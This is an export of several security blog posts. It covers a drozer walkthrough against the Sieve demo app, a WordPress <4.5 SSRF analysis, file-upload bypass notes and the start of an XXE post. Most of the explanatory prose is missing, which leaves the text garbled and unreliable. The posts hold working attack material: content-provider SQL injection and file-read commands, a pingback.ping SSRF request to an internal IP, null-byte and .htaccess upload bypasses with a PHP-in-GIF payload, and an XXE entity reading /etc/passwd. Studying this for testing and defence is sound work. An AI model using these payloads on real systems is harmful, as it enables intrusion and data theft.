      <url>2016/08/20/old-old-how-to-install-drozer-on-mac/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>drozerAndroiddrozerAndroid appAndroidexploitexploitshellcode</p><ol><li>Android<br>drozerAndroidAndroid APP</li><li><br>drozerAndroidUSB</li><li><br>drozerAndroid</li></ol><a id="more"></a><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>drozer<a href="https://github.com/mwrlabs/drozer" target="_blank" rel="noopener">https://github.com/mwrlabs/drozer</a></p><blockquote><p>windowLinuxmac</p></blockquote><p>pythonMacpython.egg<code>easy_install</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cffi==1.1.2</span><br><span class="line">cryptography==0.9.3</span><br><span class="line">drozer==2.3.4</span><br><span class="line">enum34==1.0.4</span><br><span class="line">idna==2.0</span><br><span class="line">ipaddress==1.0.14</span><br><span class="line">protobuf==2.4.1</span><br><span class="line">pyasn1==0.1.8</span><br><span class="line">pycparser==2.14</span><br><span class="line">pyOpenSSL==0.13</span><br><span class="line">six==1.9.0</span><br><span class="line">Twisted==10.2.0</span><br></pre></td></tr></table></figure><p>pyOpenSSL</p><h3 id="1-1-openssl"><a href="#1-1-openssl" class="headerlink" title="1.1 openssl"></a>1.1 openssl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ brew uninstall openssl #if installed already</span><br><span class="line">$ brew install openssl</span><br></pre></td></tr></table></figure><h3 id="1-2-pyOpenSSL"><a href="#1-2-pyOpenSSL" class="headerlink" title="1.2 pyOpenSSL"></a>1.2 pyOpenSSL</h3><p>Python.egg,Drozeropenssl pyOpenSSL v0.13<code>sed</code>typo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz</span><br><span class="line">$ tar xzvf pyOpenSSL-0.13.tar.gz</span><br><span class="line">$ cd pyOpenSSL-0.13</span><br><span class="line">$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c</span><br></pre></td></tr></table></figure></p><p>build OpenSSLOpenSSL headers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include</span><br><span class="line">$ python setup.py build</span><br><span class="line">$ python setup.py install</span><br></pre></td></tr></table></figure></p><h3 id="1-3-"><a href="#1-3-" class="headerlink" title="1.3 "></a>1.3 </h3><p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1</span><br><span class="line">$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works</span><br></pre></td></tr></table></figure></p><h3 id="1-4-drozer"><a href="#1-4-drozer" class="headerlink" title="1.4 drozer"></a>1.4 drozer</h3><p>install drozer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo easy_install ./drozer-2.3.4-py2.7.egg</span><br></pre></td></tr></table></figure></p><h3 id="1-5-runnning"><a href="#1-5-runnning" class="headerlink" title="1.5 runnning"></a>1.5 runnning</h3><p>drozer </p><h1 id="Drozer-App-Package"><a href="#Drozer-App-Package" class="headerlink" title="Drozer App Package"></a>Drozer App Package</h1><p><strong><em><a href="https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk" target="_blank" rel="noopener">sieve.apk</a></em></strong></p><p>drozer</p><p><img src="http://blog.0kami.cn/img/drozer/imag1.png" alt></p><p>App <em>**</em> app.package.* :</p><h3 id="2-1-AndroidApp"><a href="#2-1-AndroidApp" class="headerlink" title="2.1 AndroidApp"></a>2.1 AndroidApp</h3><p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve run app.package.list</span><br></pre></td></tr></table></figure></p><p>AppApp-f [App]sieveAndroid<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list -f sieve</span><br></pre></td></tr></table></figure></p><h3 id="2-2-Sieve"><a href="#2-2-Sieve" class="headerlink" title="2.2 Sieve"></a>2.2 Sieve</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="http://blog.0kami.cn/img/drozer/imag2.png" alt></p><h3 id="2-3-Itentify-The-Attack-Surface-"><a href="#2-3-Itentify-The-Attack-Surface-" class="headerlink" title="2.3 Itentify The Attack Surface()"></a>2.3 Itentify The Attack Surface()</h3><p>Android IPCAppApp Attack Surface<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag3.png" alt><br> exportedApp services is debuggableadb</p><h3 id="2-4-Attack-Surface"><a href="#2-4-Attack-Surface" class="headerlink" title="2.4 Attack Surface"></a>2.4 Attack Surface</h3><p>ativityattack surface<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag4.png" alt></p><h3 id="2-5-Activities"><a href="#2-5-Activities" class="headerlink" title="2.5 Activities"></a>2.5 Activities</h3><p>PWListFileSelectActivityexporteddrozerPWList<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure></p><h3 id="2-6-Content-Provider"><a href="#2-6-Content-Provider" class="headerlink" title="2.6 Content Provider"></a>2.6 Content Provider</h3><p>2.3<code>content provider</code><code>attact surface</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag5.png" alt><br>2.3exported<code>content provider</code></p><h5 id="2-6-1-Content-ProviderURI"><a href="#2-6-1-Content-ProviderURI" class="headerlink" title="2.6.1 Content ProviderURI"></a>2.6.1 Content ProviderURI</h5><p>DBContentProviderContent URI content:/// ,content URIsDBcontent Provider READ_KEYSWRITE_KEYS/Keys<br>drozerscannercontent URIs<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag6.png" alt><br>contentURIdrozerURIcontent <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ vertical</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag7.png" alt><br>Base64</p><h5 id="2-6-2-SQL"><a href="#2-6-2-SQL" class="headerlink" title="2.6.2 SQL"></a>2.6.2 SQL</h5><p>AndroidSQLiteSQLiteSQLSQL <code>projection</code><code>seleciton</code>SQLContent provider<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ projection </span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ selection </span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag8.png" alt><br>Android<br>Sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ projection * FROM SQLITE_MASTER WHERE type=table;</span><br></pre></td></tr></table></figure></p><p>SQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ projection * FROM Key;</span><br></pre></td></tr></table></figure></p><p>SQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ projection * FROM Key;</span><br></pre></td></tr></table></figure></p><h5 id="2-6-3-File-System-Backed-Content-Providers"><a href="#2-6-3-File-System-Backed-Content-Providers" class="headerlink" title="2.6.3 File System-Backed Content Providers"></a>2.6.3 File System-Backed Content Providers</h5><p><code>File System-backed Content Provider</code>AndroidAppFile System-backed Content ProviderApp sieve<code>FileBackupProvider</code>file system-backed content provider drozerapp.provider.read<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure></p><p><code>app.provider.download</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db</span><br></pre></td></tr></table></figure></p><h5 id="2-6-4-Content-Provider"><a href="#2-6-4-Content-Provider" class="headerlink" title="2.6.4 Content Provider"></a>2.6.4 Content Provider</h5><p>SQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><strong><em>scanner</em></strong></p><h3 id="2-7-Services"><a href="#2-7-Services" class="headerlink" title="2.7 Services"></a>2.7 Services</h3><p>exportedservices<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p>Services<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService msg 1 5 3</span><br></pre></td></tr></table></figure></p><h3 id="2-8-"><a href="#2-8-" class="headerlink" title="2.8 "></a>2.8 </h3><ul><li>shell.start AndroidLinux Shell</li><li>tools.file.upload / tools.file.downloa</li><li>tools.setup.busybox / tools.setup.minimalsu  busyboxminimalsuAndroid</li></ul><p><a href="https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/" target="_blank" rel="noopener">https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/</a><br><a href="http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/" target="_blank" rel="noopener">http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/</a></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mobile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Analysiswordpress SSRF &lt;4.5</title>
      <link href="2016/08/19/old-old-wordpress-ssrf-4-4-2/"/>
      <url>2016/08/19/old-old-wordpress-ssrf-4-4-2/</url>
      
        <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>wordpressSSRFwordpress<br><a id="more"></a></p><h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><p>ip</p><h6 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h6><ul><li>192.168.1.2</li><li>11000000101010000000000100000010192.168.1.2</li></ul><h6 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h6><ul><li>3232235778<a href="http://3232235778" target="_blank" rel="noopener">http://3232235778</a> 192.168.1.2<code>192*256^3+168*256^2+1*256+2=3232235778</code></li><li>IP 192.168.1.280300.0250.01.0208</li><li>IP 192.168.1.2160xc0.0xA8.1.20x16</li><li>0300.0xA8.1.0x02</li></ul><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>508 <code>wp_http_validate_url</code> <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( ! $same_host ) &#123;</span><br><span class="line">$host = trim( $parsed_url[<span class="string">'host'</span>], <span class="string">'.'</span> );</span><br><span class="line"><span class="keyword">if</span> ( preg_match( <span class="string">'#^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$#'</span>, $host ) ) &#123;</span><br><span class="line">$ip = $host;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$ip = gethostbyname( $host );</span><br><span class="line"><span class="keyword">if</span> ( $ip === $host ) <span class="comment">// Error condition for gethostbyname()</span></span><br><span class="line">$ip = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $ip ) &#123;</span><br><span class="line">$parts = array_map( <span class="string">'intval'</span>, explode( <span class="string">'.'</span>, $ip ) );</span><br><span class="line"><span class="keyword">if</span> ( <span class="number">127</span> === $parts[<span class="number">0</span>] || <span class="number">10</span> === $parts[<span class="number">0</span>] || <span class="number">0</span> === $parts[<span class="number">0</span>]</span><br><span class="line">|| ( <span class="number">172</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">16</span> &lt;= $parts[<span class="number">1</span>] &amp;&amp; <span class="number">31</span> &gt;= $parts[<span class="number">1</span>] )</span><br><span class="line">|| ( <span class="number">192</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">168</span> === $parts[<span class="number">1</span>] )</span><br><span class="line">) &#123;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure></p><p><code>^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$</code>ipip<br>ifurlip8<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $parsed_url[<span class="string">'port'</span>] ) )</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line"></span><br><span class="line">$port = $parsed_url[<span class="string">'port'</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="number">80</span> === $port || <span class="number">443</span> === $port || <span class="number">8080</span> === $port )</span><br><span class="line"><span class="keyword">return</span> $url;</span><br></pre></td></tr></table></figure></p><p>80,443,8080<br>8ip80,443,8080<br>,class-wp-xmlrpc-server.phpwp_safe_remote_getgetgetwp_http_validate_urlssrf</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>xmlrpc.phppingback.ping<br>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 321</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure></p><p>10.10.10.111<br><img src="http://blog.0kami.cn/img/wordpress_ssrf_4_4_2/wordpress-ssrf.png" alt="image"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>10.x.x.xip30810,80,443,8080<br>xmlrpcwordpresspingback.pingDDOS</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="http://xlab.baidu.com/wordpress/" target="_blank" rel="noopener">http://xlab.baidu.com/wordpress/</a><br><a href="https://virusdefender.net/index.php/archives/733/" target="_blank" rel="noopener">https://virusdefender.net/index.php/archives/733/</a></p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VULNERABLITY</title>
      <link href="2016/07/04/old-old-file-upload/"/>
      <url>2016/07/04/old-old-file-upload/</url>
      
        <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><a href="http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf" target="_blank" rel="noopener"></a><br><a id="more"></a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li>javascript</li><li>MIMEContent-type</li><li>path</li><li></li><li></li></ol><h3 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h3><p>jspng,jpg,gif<br>firebugburp<br>burpburp</p><h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>) &#123; <span class="comment">//Content-type</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile))   &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phpMIME<br><code>$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;</code>gif<br>burp<code>Content-Type</code><code>image/gif</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>web%00,windows%80-%90<br><code>image/20160704/</code><code>image/20160704/evil.php%00</code><code>image/20160704/evil.php%00filename.gif</code>00evil.php</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li><br>html|htm|php|php2|php3|php4|php5<br><br></li></ol><ul><li>PhpAsp</li><li>(asacer)</li><li>0x00asp,asp<code>evil.asp%00.jpg</code>jpg</li><li>windowsevil.php.evil.php (),windows.</li><li>.htaccess.htaccess</li></ul><h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h5><p>.htaccess<br>php.htaccess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;haha&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p><p>haha<br> php php<br><br>     PHP manual <br>    move_uploaded_file section, there is a warning which states If the destination file already exists, it will be overwritten.<br>     PHP <br>     move_uploaded_file .htaccess <br>    </p><ul><li>apacheiis6.0nginx</li></ul><h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><p>apache</p><h4 id="iis6-0"><a href="#iis6-0" class="headerlink" title="iis6.0"></a>iis6.0</h4><ul><li>iis6.0;evil.asp;.htmlasp</li><li>IIS6.000</li><li>IIS6.0</li><li><code>.asp</code>asp</li></ul><h4 id="iis7-0-7-5"><a href="#iis7-0-7-5" class="headerlink" title="iis7.0/7.5"></a>iis7.0/7.5</h4><p>phpNginx<code>evil.jpg/evil.php</code> evil.jpgphpphp-cgi</p><h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><ul><li>php/.phpevil.jpg/.phpevil.jpgphp</li><li>%00</li><li><br>filename=evil.phpevil.php.jpg</li></ul><ol start="2"><li></li></ol><ul><li>0x00</li><li></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><ul><li><br>jpgvalue= FF D8 FF E0 00 10 4A 46 49 46<br>gifvalue= 47 49 46 38 39 61<br>pngvalue= 89 50 4E 47</li></ul><p></p><ul><li></li></ul><p>phpgetimagesize()data<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure></p><ul><li></li></ul><p>APIdiff</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h6 id=""><a href="#" class="headerlink" title=""></a></h6><ol><li> javascript <br> &lt; burp  POST &gt;</li><li> http request  MIME <br> &lt; burp  POST  MIME &gt;</li></ol><h6 id="-"><a href="#-" class="headerlink" title="/"></a>/</h6><ol><li><p><br> <br> <br> <br> 0x00 <br> .htaccess <br> <br> Apache <br> IIS <br> Nginx </p></li><li><p><br> 0x00 <br> <br> IIS <br> Nginx </p></li><li></li></ol><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>&lt;/&gt;</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VULNERABLITYXML External Entity(XXE)</title>
      <link href="2016/06/28/old-old-xxe/"/>
      <url>2016/06/28/old-old-xxe/</url>
      
        <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>XML<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a><br><a id="more"></a><br>XML<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span>  xml</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>   (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>   (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span>   (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>   (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>This is a Test<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>XML<br>DTD XML DTD  XML </p><h6 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h6><p><code>&lt;!DOCTYPE  []&gt;</code></p><h6 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h6><p><code>&lt;!DOCTYPE  SYSTEM &quot;&quot;&gt;</code><code>&lt;!DOCTYPE  PUBLIC &quot;public_ID&quot; &quot;&quot;&gt;</code><br>DTD</p><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p><code>&lt;!ENTITY  &quot;&quot;&gt;</code></p><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p><code>&lt;!ENTITY  SYSTEM &quot;URI&quot;&gt;</code><code>&lt;!ENTITY  PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p><h6 id="OWASP"><a href="#OWASP" class="headerlink" title="OWASP"></a><a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="noopener">OWASP</a></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</span><br></pre></td></tr></table></figure><p>XML</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><ul><li></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span 